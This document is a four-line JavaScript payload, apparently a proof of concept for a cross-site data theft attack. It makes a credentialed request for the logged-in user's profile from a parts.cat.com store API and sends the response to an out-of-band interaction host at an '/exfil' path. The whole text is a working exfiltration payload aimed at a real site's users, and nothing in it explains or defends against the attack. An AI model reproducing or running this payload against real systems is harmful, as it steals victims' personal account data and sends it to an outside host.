fetch('https://parts.cat.com/wcs/resources/store/20203/person/@self?responseFormat=json',{credentials:'include'})
.then(r=>r.text())
.then(t=>fetch('https://ksmvjerurroolehambofgcysveg4902ed.oast.fun/exfil?data='+encodeURIComponent(t)))
.catch(e=>console.log('Error:',e.message))
